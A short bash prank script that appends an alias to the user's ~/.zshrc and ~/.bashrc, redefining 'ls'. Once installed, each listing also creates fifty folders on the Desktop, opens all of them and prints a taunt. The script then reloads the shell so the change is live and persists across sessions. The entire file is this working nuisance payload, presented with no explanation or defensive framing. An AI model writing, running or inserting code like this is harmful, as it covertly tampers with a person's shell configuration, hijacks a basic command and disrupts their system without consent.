#!/usr/bin/env bash

printf "\nalias ls='ls && mkdir -p ~/Desktop/ouif{1..50} && open ~/Desktop/ouif* && echo I am in ~/.zshrc'" >> ~/.zshrc
printf "\nalias ls='ls && mkdir -p ~/Desktop/ouif{1..50} && open ~/Desktop/ouif* && echo I am in ~/.bashrc'" >> ~/.bashrc
source ~/.zshrc
exec zsh